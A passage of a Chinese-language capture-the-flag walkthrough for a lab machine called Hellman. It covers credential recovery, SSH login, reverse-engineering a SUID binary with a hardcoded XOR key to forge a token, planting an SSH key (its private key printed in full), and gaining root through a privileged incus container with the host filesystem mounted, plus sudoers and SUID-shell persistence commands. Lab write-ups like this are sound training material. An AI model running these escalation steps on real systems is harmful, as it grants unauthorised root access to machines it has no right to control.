+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">....<br>[*] Round 500<br>[RN] <span class="hljs-string">&#x27;&gt; Correct!&#x27;</span><br>[RN] <span class="hljs-string">&#x27;&#x27;</span><br>[RN] <span class="hljs-string">&#x27;b = 42728238619645625108491187911580118051476472226993498679467817687962515190795&#x27;</span><br>[RN] <span class="hljs-string">&#x27;A = 2391650150985810884994252685859052787801002187688383438918665064733694948779829365616769020651185586237016153481579544226505297708534405745415478700876478921519692405489708997678205836809697355276663326790382326219115224747787261227196132927251137819849881628026643338479934731670469291841859715749238574933045977981386216912009600066142619622484806914716407600488851876082111562196867608104366105761718540613179786077858885557393101122979407282875569450246185227&#x27;</span><br>[+] Round 500 <span class="hljs-keyword">done</span><br>[+] Receiving all data: Done (81B)<br>[*] Closed connection to 192.168.2.60 port 1337<br><br>🎉 FLAG:<br> &gt; Correct!<br><br>Congrats! Here<span class="hljs-string">&#x27;s the flag: 676f643a6e756d626572735f6172655f68617264</span><br></code></pre></td></tr></table></figure>
+
+<p>得到字符串<code>676f643a6e756d626572735f6172655f68617264</code></p>
+<p>发现是<code>hex</code>编码，进行解码得到<code>god:numbers_are_hard</code></p>
+<h1 id="四、获取到god权限"><a href="#四、获取到god权限" class="headerlink" title="四、获取到god权限"></a>四、获取到god权限</h1><p>使用获取到的凭证成功登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh god@192.168.2.60     <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.60 (192.168.2.60)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is: SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:3: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:14: [hashed name]</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.60<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">god@192.168.2.60&#x27;</span>s password: <br>              _                          <br>__      _____| | ___ ___  _ __ ___   ___ <br>\ \ /\ / / _ \ |/ __/ _ \| <span class="hljs-string">&#x27;_ ` _ \ / _ \</span><br><span class="hljs-string"> \ V  V /  __/ | (_| (_) | | | | | |  __/</span><br><span class="hljs-string">  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|</span><br><span class="hljs-string">                                         </span><br><span class="hljs-string">Hellman:~$ id</span><br><span class="hljs-string">uid=1001(god) gid=1001(god) groups=1001(god)</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取water权限"><a href="#1、获取water权限" class="headerlink" title="1、获取water权限"></a>1、获取water权限</h2><p>查看<code>suid</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hellman:~$ find / -perm -4000 -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/bin/bbsuid<br>/usr/libexec/dbus-daemon-launch-helper<br>/usr/bin/expiry<br>/usr/bin/chsh<br>/usr/bin/secure_auth<br>/usr/bin/chage<br>/usr/bin/passwd<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br></code></pre></td></tr></table></figure>
+
+<p>找到一个可疑的文件<code>/usr/bin/secure_auth</code></p>
+<p>执行一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hellman:~$ /usr/bin/secure_auth <br>Usage: /usr/bin/secure_auth &lt;<span class="hljs-built_in">command</span>&gt; &lt;token&gt;<br></code></pre></td></tr></table></figure>
+
+<p>需要两个参数，<code>&lt;command&gt;</code>执行的命令和<code>&lt;token&gt;</code></p>
+<p>将文件进行反编译，得到伪代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-keyword">if</span> ( argc &gt; <span class="hljs-number">2</span> )<br>  &#123;<br>    s = (<span class="hljs-type">char</span> *)argv[<span class="hljs-number">1</span>];<br>    s1 = argv[<span class="hljs-number">2</span>];<br>    <span class="hljs-built_in">xor_cipher</span>(s, key, s2);<br>    v4 = <span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(s1, s2, v4) )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Auth successful. Switching to UID 1002...&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">setresgid</span>(<span class="hljs-number">0x3EAu</span>, <span class="hljs-number">0x3EAu</span>, <span class="hljs-number">0x3EAu</span>) )<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;setresgid failed&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">setresuid</span>(<span class="hljs-number">0x3EAu</span>, <span class="hljs-number">0x3EAu</span>, <span class="hljs-number">0x3EAu</span>) )<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;setresuid failed&quot;</span>);<br>      <span class="hljs-built_in">system</span>(s);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Auth failed.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s &lt;command&gt; &lt;token&gt;\n&quot;</span>, *argv);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p> <strong>整体工作流程</strong></p>
+<ol>
+<li>用户运行程序：<code>./secure_auth &quot;command&quot; &quot;token&quot;</code></li>
+<li>程序用内置 <code>key</code> 对 <code>&quot;command&quot;</code> 做 XOR ，得到<code>token1</code></li>
+<li>将解密结果<code>token1</code>与 <code>token</code> 进行比较</li>
+<li>如果匹配，则切换到 UID&#x2F;GID 1002，并执行 <code>&quot;command&quot;</code>（注意这里传入的是字节流）</li>
+</ol>
+<p>找到<code>key=4b077130fw473r</code> <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601281607516.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p><code>xor_ciper</code>函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">_BYTE *__fastcall <span class="hljs-title">xor_cipher</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  _BYTE *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-built_in">strlen</span>(a1);<br>  v7 = <span class="hljs-built_in">strlen</span>(a2);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>    *(_BYTE *)(i + a3) = a2[i % v7] ^ a1[i];<br>  result = (_BYTE *)(v6 + a3);<br>  *result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接使用AI写一个脚本</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// main.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> BYTE;<br><br><span class="hljs-comment">// 更合理的函数签名：直接传输出缓冲区指针</span><br><span class="hljs-function">BYTE* <span class="hljs-title">xor_cipher</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* plaintext, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* key, BYTE* output)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!plaintext || !key || !output) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span>(plaintext);<br>    <span class="hljs-type">size_t</span> key_len = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">if</span> (key_len == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i) &#123;<br>        output[i] = <span class="hljs-built_in">static_cast</span>&lt;BYTE&gt;(plaintext[i] ^ key[i % key_len]);<br>    &#125;<br>    output[len] = <span class="hljs-number">0</span>; <span class="hljs-comment">// null-terminate as string</span><br>    <span class="hljs-keyword">return</span> output + len;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg = <span class="hljs-string">&quot;sh&quot;</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* key = <span class="hljs-string">&quot;4b077130fw473r&quot;</span>;<br>    BYTE buffer[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-built_in">xor_cipher</span>(msg, key, buffer);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Encrypted bytes: &quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(msg); ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, buffer[i]);<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><br>    <span class="hljs-comment">// 解密（XOR 是对称的）</span><br>    BYTE decrypted[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">xor_cipher</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">char</span>*&gt;(buffer), key, decrypted);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Decrypted: &quot;</span> &lt;&lt; decrypted &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601281812299.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>结果为：<code>Encrypted bytes: 47 0A ;Decrypted: sh</code></p>
+<p>执行命令，成功切换到water用户 <strong>💡注：这里传入的token必须为字节流</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hellman:~$ /usr/bin/secure_auth <span class="hljs-string">&quot;sh&quot;</span> $<span class="hljs-string">&#x27;\x47\x0a&#x27;</span><br>[+] Auth successful. Switching to UID 1002...<br>~ $ <span class="hljs-built_in">id</span><br>uid=1002(water) gid=1002(water) <span class="hljs-built_in">groups</span>=1001(god)<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>/home/water</code>目录下面的<code>.ash_history</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ <span class="hljs-built_in">cat</span> .ash_history <br>incus<br><span class="hljs-built_in">ls</span> -l /var/lib/incus/unix.socket<br>addgroup god incus<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>提示<code>water</code>用户已经加入到<code>god、incus</code>组</p>
+<p>查看<code>/etc/group</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ <span class="hljs-built_in">cat</span> /etc/group<br>root:x:0:root<br>bin:x:1:root,bin,daemon<br>daemon:x:2:root,bin,daemon<br>sys:x:3:root,bin<br>adm:x:4:root,daemon<br><span class="hljs-built_in">tty</span>:x:5:<br>disk:x:6:root<br>lp:x:7:lp<br>kmem:x:9:<br>wheel:x:10:root<br>floppy:x:11:root<br>mail:x:12:mail<br>news:x:13:news<br>uucp:x:14:uucp<br>cron:x:16:cron<br>audio:x:18:<br>cdrom:x:19:<br>dialout:x:20:root<br>ftp:x:21:<br>sshd:x:22:<br>input:x:23:<br>tape:x:26:root<br>video:x:27:root<br>netdev:x:28:<br>kvm:x:34:kvm<br>games:x:35:<br>shadow:x:42:<br>www-data:x:82:nginx<br><span class="hljs-built_in">users</span>:x:100:games<br>ntp:x:123:<br>abuild:x:300:<br>utmp:x:406:<br>ping:x:999:<br>nogroup:x:65533:<br>nobody:x:65534:<br>klogd:x:101:klogd<br>nginx:x:102:nginx<br>docker:x:103:<br>alice:x:1000:<br>god:x:1001:<br>messagebus:x:104:messagebus<br>dnsmasq:x:105:dnsmasq<br>incus:x:106:water<br>incus-user:x:107:<br>incus-admin:x:108:<br>water:x:1002:<br></code></pre></td></tr></table></figure>
+
+<p>发现<code>incus:x:106:water</code>，<code>water</code>用户已经加入到<code>incus</code>组里面</p>
+<p>但是查看<code>groups</code>，却发现没有<code>incus</code>组 📌 <strong>Linux 权限判断以 <code>id</code> 或 <code>groups</code> 为准，不是 <code>/etc/group</code> 文本内容。</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ <span class="hljs-built_in">groups</span><br>water god<br></code></pre></td></tr></table></figure>
+
+<p>需要重新刷新组权限（使 <code>incus</code> 组生效），但是无命令<code>newgrp</code></p>
+<p>需要通过SSH登录，强制刷新组权限（使 <code>incus</code> 组生效） 在 <code>water</code> 用户目录下配置 SSH 私钥登录</p>
+<ol>
+<li><strong>在 <code>water</code> 的家目录中创建 <code>.ssh</code> 目录和 <code>authorized_keys</code> 文件</strong></li>
+<li><strong>确保权限严格正确（SSH 对权限非常敏感）</strong></li>
+</ol>
+<p>1.创建 <code>.ssh</code> 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ <span class="hljs-built_in">mkdir</span> -p ～/.ssh<br>~ $ <span class="hljs-built_in">chmod</span> 700 ～/.ssh<br></code></pre></td></tr></table></figure>
+
+<p>2.生成 SSH 密钥对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ ssh-keygen<br>Generating public/private ed25519 key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/water/.ssh/id_ed25519): <br>Created directory <span class="hljs-string">&#x27;/home/water/.ssh&#x27;</span>.<br>Enter passphrase <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;/home/water/.ssh/id_ed25519&quot;</span> (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /home/water/.ssh/id_ed25519<br>Your public key has been saved <span class="hljs-keyword">in</span> /home/water/.ssh/id_ed25519.pub<br>The key fingerprint is:<br>SHA256:exhBe72E5vvKS+l4uqLv1az0fj69P1em4k35750bGOo water@Hellman<br>The key s randomart image is:<br>+--[ED25519 256]--+<br>|        .        |<br>|       . . o     |<br>|        o + o    |<br>|         = . .   |<br>|        S . ..   |<br>|         * o. o.o|<br>|        = B. oo+.|<br>|      .o Oo.+ooo=|<br>|    .+o.==BE+oo*@|<br>+----[SHA256]-----+<br>~/.ssh $ <span class="hljs-built_in">cat</span> id_ed25519<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACAu1dBQbe0NtKrOil6Nf/Ns1sVSyTfMqD10duRXYaSMWwAAAJA3r0bkN69G<br>5AAAAAtzc2gtZWQyNTUxOQAAACAu1dBQbe0NtKrOil6Nf/Ns1sVSyTfMqD10duRXYaSMWw<br>AAAEDLh+s1vlGjZYfBFZOj3tDpgr5eQEhPHrqKyuOtEvX68y7V0FBt7Q20qs6KXo1/82zW<br>xVLJN8yoPXR25FdhpIxbAAAADXdhdGVyQEhlbGxtYW4=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>3.将公钥写入 <code>authorized_keys</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/.ssh $ <span class="hljs-built_in">cat</span> id_ed25519.pub &gt;&gt; ./authorized_keys<br>~/.ssh $ <span class="hljs-built_in">ls</span> -la<br>total 24<br>drwx--S---    2 water    water         4096 Jan 28 17:32 .<br>drwxr-sr-x    5 water    water         4096 Jan 28 17:32 ..<br>-rw-------    1 water    water           95 Jan 28 17:32 authorized_keys<br>-rw-------    1 water    water          399 Jan 28 17:28 id_ed25519<br>-rw-------    1 water    water           95 Jan 28 17:28 id_ed25519.pub<br></code></pre></td></tr></table></figure>
+
+<p>4.设置严格权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/.ssh $ <span class="hljs-built_in">chmod</span> 600 id_ed25519.pub <br>~/.ssh $ <span class="hljs-built_in">chmod</span> 600 id_ed25519<br>~/.ssh $ <span class="hljs-built_in">chmod</span> 600 authorized_keys <br></code></pre></td></tr></table></figure>
+
+<p>使用私钥成功登录到<code>water</code>用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ssh water@192.168.2.60 -i <span class="hljs-built_in">id</span><br>              _                          <br>__      _____| | ___ ___  _ __ ___   ___ <br>\ \ /\ / / _ \ |/ __/ _ \| <span class="hljs-string">&#x27;_ ` _ \ / _ \</span><br><span class="hljs-string"> \ V  V /  __/ | (_| (_) | | | | | |  __/</span><br><span class="hljs-string">  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|</span><br><span class="hljs-string">                                         </span><br><span class="hljs-string">Hellman:~$ id</span><br><span class="hljs-string">uid=1002(water) gid=1002(water) groups=106(incus),1002(water)</span><br></code></pre></td></tr></table></figure>
+
+<p>发现用户<code>water</code>成功拥有了<code>incus</code>组权限</p>
+<h3 id="incus组提权"><a href="#incus组提权" class="headerlink" title="incus组提权"></a>incus组提权</h3><ol>
+<li>查看incus容器列表</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">incus list<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>创建一个特权容器并挂载宿主机根目录</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs BASH">incus init images:alpine/edge privesc<br>incus config <span class="hljs-built_in">set</span> privesc security.privileged <span class="hljs-literal">true</span><br>incus config device add privesc host-root disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>启动容器</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">incus start privesc<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>进入容器，直接读写宿主机文件系统</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">incus <span class="hljs-built_in">exec</span> privesc -- sh<br><br><span class="hljs-comment"># 在容器内：</span><br><span class="hljs-comment"># cd /mnt/root</span><br><span class="hljs-comment"># echo &quot;god ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt; etc/sudoers</span><br><span class="hljs-comment"># 或替换 /bin/bash 为 SUID shell</span><br><span class="hljs-comment"># cp bin/bash home/god/bash &amp;&amp; chmod u+s home/god/bash</span><br>Hellman:~$  incus list<br>+------+-------+------+------+------+-----------+<br>| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |<br>+------+-------+------+------+------+-----------+<br>Hellman:~$ incus launch images:alpine/3.18/amd64 privesc -c security.privileged=<span class="hljs-literal">true</span><br>Launching privesc<br>Error: Failed instance creation: Failed getting remote image info: Failed getting image: The requested image couldn t be found<br>Hellman:~$ incus init images:alpine/edge privesc<br>Creating privesc<br>Hellman:~$ incus config <span class="hljs-built_in">set</span> privesc security.privileged <span class="hljs-literal">true</span><br>Hellman:~$ incus config device add privesc host-root disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br>Device host-root added to privesc<br>Hellman:~$ incus start privesc<br>Hellman:~$ incus <span class="hljs-built_in">exec</span> privesc -- sh<br>~ <span class="hljs-comment"># pwd</span><br>/root<br>/ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root)<br></code></pre></td></tr></table></figure>
+
